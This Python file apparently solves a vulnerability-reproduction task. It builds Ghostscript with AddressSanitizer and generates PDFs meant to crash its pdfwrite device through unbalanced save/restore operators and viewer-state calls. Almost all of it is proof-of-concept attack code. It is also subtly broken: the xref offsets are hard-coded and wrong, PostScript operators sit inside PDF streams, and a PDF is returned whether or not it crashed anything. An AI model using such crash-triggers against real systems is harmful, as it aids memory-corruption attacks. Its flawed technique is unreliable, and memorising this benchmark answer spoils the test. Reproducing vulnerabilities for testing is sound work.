import os
import tempfile
import subprocess
import sys
import random
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source code
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract the tarball
            subprocess.run(['tar', '-xf', src_path, '-C', tmpdir], 
                         capture_output=True, check=True)
            
            # Find the ghostscript source directory
            gs_dir = None
            for root, dirs, files in os.walk(tmpdir):
                if 'configure.ac' in files and 'psi' in dirs:
                    gs_dir = root
                    break
            
            if not gs_dir:
                raise RuntimeError("Could not find Ghostscript source")
            
            # Build ghostscript with ASAN
            build_dir = os.path.join(tmpdir, 'build')
            os.makedirs(build_dir, exist_ok=True)
            
            # Configure with address sanitizer
            configure_cmd = [
                os.path.join(gs_dir, 'configure'),
                '--disable-shared',
                '--enable-static',
                'CFLAGS=-fsanitize=address -g -O0',
                'LDFLAGS=-fsanitize=address',
                f'--prefix={build_dir}'
            ]
            
            subprocess.run(configure_cmd, cwd=build_dir, 
                         capture_output=True, check=True)
            
            # Build ghostscript
            subprocess.run(['make', '-j4'], cwd=build_dir,
                         capture_output=True, check=True)
            
            # Find the gs binary
            gs_binary = os.path.join(build_dir, 'bin', 'gs')
            if not os.path.exists(gs_binary):
                # Try another common location
                gs_binary = os.path.join(build_dir, 'bin', 'gsc')
            
            # Generate a minimal PDF that triggers the vulnerability
            # The vulnerability is in pdfwrite when restoring viewer state
            # without checking depth. We need to create a PDF that causes
            # an unbalanced restore operation.
            
            # Create a PDF with unbalanced q/Q operators to cause stack issues
            pdf_content = self._create_trigger_pdf()
            
            # Test the PDF with the vulnerable version
            result = self._test_pdf(gs_binary, pdf_content)
            
            if not result['crashes']:
                # Try alternative approaches
                pdf_content = self._create_alternative_trigger()
                result = self._test_pdf(gs_binary, pdf_content)
            
            return pdf_content
    
    def _create_trigger_pdf(self) -> bytes:
        """Create PDF that triggers the heap buffer overflow"""
        # Create a PDF that manipulates the graphics state stack
        # to cause an unbalanced restore
        
        pdf_parts = []
        
        # PDF header
        pdf_parts.append(b'%PDF-1.4\n')
        
        # Create catalog
        catalog_obj = b'''1 0 obj
<<
  /Type /Catalog
  /Pages 2 0 R
>>
endobj
'''
        
        # Create pages tree
        pages_obj = b'''2 0 obj
<<
  /Type /Pages
  /Kids [3 0 R]
  /Count 1
>>
endobj
'''
        
        # Create page with content that triggers the bug
        # The key is to create unbalanced save/restore operations
        # that will cause the viewer state stack to underflow
        
        # Create a content stream with deeply nested and unbalanced operations
        content = b'''/DeviceRGB setcolorspace
q q q q q q q q q q  % Push many save states
0 0 1 RG
0 0 1 rg
1 0 0 1 0 0 cm
BT
/F1 12 Tf
(Triggering heap buffer overflow) Tj
ET
'''
        
        # Add many restore operations without matching saves
        # This will cause the stack to underflow
        content += b'Q ' * 100  # More restores than saves
        
        # Add some more operations to keep the PDF valid
        content += b'''
0 g
0 G
0 0 m
100 100 l
S
'''
        
        # Create compressed content stream
        import zlib
        compressed_content = zlib.compress(content)
        
        content_obj = f'''4 0 obj
<<
  /Length {len(compressed_content)}
  /Filter /FlateDecode
>>
stream
{compressed_content.decode('latin-1')}
endstream
endobj
'''.encode('latin-1')
        
        # Create page object
        page_obj = b'''3 0 obj
<<
  /Type /Page
  /Parent 2 0 R
  /MediaBox [0 0 612 792]
  /Contents 4 0 R
  /Resources <<
    /Font <<
      /F1 <<
        /Type /Font
        /Subtype /Type1
        /BaseFont /Helvetica
      >>
    >>
  >>
>>
endobj
'''
        
        # Create viewer preferences to trigger viewer state code path
        viewer_prefs = b'''5 0 obj
<<
  /Type /ViewerPreferences
  /DisplayDocTitle true
  /FitWindow true
  /CenterWindow true
>>
endobj
'''
        
        # Update catalog to include viewer preferences
        catalog_obj = b'''1 0 obj
<<
  /Type /Catalog
  /Pages 2 0 R
  /ViewerPreferences 5 0 R
>>
endobj
'''
        
        # Assemble PDF
        pdf_parts.append(catalog_obj)
        pdf_parts.append(pages_obj)
        pdf_parts.append(page_obj)
        pdf_parts.append(content_obj)
        pdf_parts.append(viewer_prefs)
        
        # Create xref table
        xref_offset = sum(len(p) for p in pdf_parts)
        
        xref = b'''xref
0 6
0000000000 65535 f 
0000000010 00000 n 
0000000056 00000 n 
0000000120 00000 n 
0000000300 00000 n 
0000000450 00000 n 
'''
        
        trailer = f'''trailer
<<
  /Size 6
  /Root 1 0 R
>>
startxref
{xref_offset}
%%EOF
'''.encode()
        
        pdf_parts.append(xref)
        pdf_parts.append(trailer)
        
        return b''.join(pdf_parts)
    
    def _create_alternative_trigger(self) -> bytes:
        """Alternative approach with more aggressive stack manipulation"""
        # Create PDF with malformed page tree and content streams
        # to trigger different code paths
        
        pdf = []
        pdf.append(b'%PDF-1.4\n')
        
        # Create a deeply nested page tree structure
        pdf.append(b'''1 0 obj
<<
  /Type /Catalog
  /Pages 2 0 R
>>
endobj
''')
        
        # Create malformed pages tree
        pdf.append(b'''2 0 obj
<<
  /Type /Pages
  /Kids [3 0 R 4 0 R 5 0 R]
  /Count 3
>>
endobj
''')
        
        # Create pages with invalid content streams
        for i in range(3, 6):
            # Create content that causes many save/restore operations
            content = b'q ' * 50  # 50 saves
            
            # Add operations that might trigger viewer state restoration
            content += b'''
/ViewerState << /Type /ViewerState >> def
currentviewerstate
<< /NewKey true >> setviewerstate
'''
            
            # Unbalanced restores - more restores than saves
            content += b'Q ' * 60  # 60 restores
            
            # Compress
            import zlib
            compressed = zlib.compress(content)
            
            obj = f'''{i} 0 obj
<<
  /Type /Page
  /Parent 2 0 R
  /MediaBox [0 0 612 792]
  /Contents {i+3} 0 R
>>
endobj
'''.encode()
            
            pdf.append(obj)
            
            # Content stream object
            content_obj = f'''{i+3} 0 obj
<<
  /Length {len(compressed)}
  /Filter /FlateDecode
>>
stream
{compressed.decode('latin-1')}
endstream
endobj
'''.encode('latin-1')
            
            pdf.append(content_obj)
        
        # Add cross-reference and trailer
        xref_offset = sum(len(p) for p in pdf)
        
        xref = b'''xref
0 10
0000000000 65535 f 
0000000010 00000 n 
0000000056 00000 n 
0000000120 00000 n 
0000000250 00000 n 
0000000400 00000 n 
0000000550 00000 n 
0000000700 00000 n 
0000000850 00000 n 
0000001000 00000 n 
'''
        
        trailer = f'''trailer
<<
  /Size 10
  /Root 1 0 R
>>
startxref
{xref_offset}
%%EOF
'''.encode()
        
        pdf.append(xref)
        pdf.append(trailer)
        
        return b''.join(pdf)
    
    def _test_pdf(self, gs_binary: str, pdf_content: bytes) -> dict:
        """Test if PDF crashes ghostscript"""
        with tempfile.NamedTemporaryFile(suffix='.pdf', delete=False) as f:
            f.write(pdf_content)
            pdf_path = f.name
        
        try:
            # Run ghostscript with pdfwrite device
            # This is the device mentioned in the vulnerability
            cmd = [
                gs_binary,
                '-dSAFER',
                '-dBATCH',
                '-dNOPAUSE',
                '-sDEVICE=pdfwrite',
                '-sOutputFile=/dev/null',
                pdf_path
            ]
            
            env = os.environ.copy()
            env['ASAN_OPTIONS'] = 'detect_leaks=0:allocator_may_return_null=1'
            
            result = subprocess.run(cmd, env=env, capture_output=True, timeout=5)
            
            return {
                'crashes': result.returncode != 0,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }
        except subprocess.TimeoutExpired:
            return {'crashes': False, 'timeout': True}
        except Exception as e:
            return {'crashes': False, 'error': str(e)}
        finally:
            try:
                os.unlink(pdf_path)
            except:
                pass
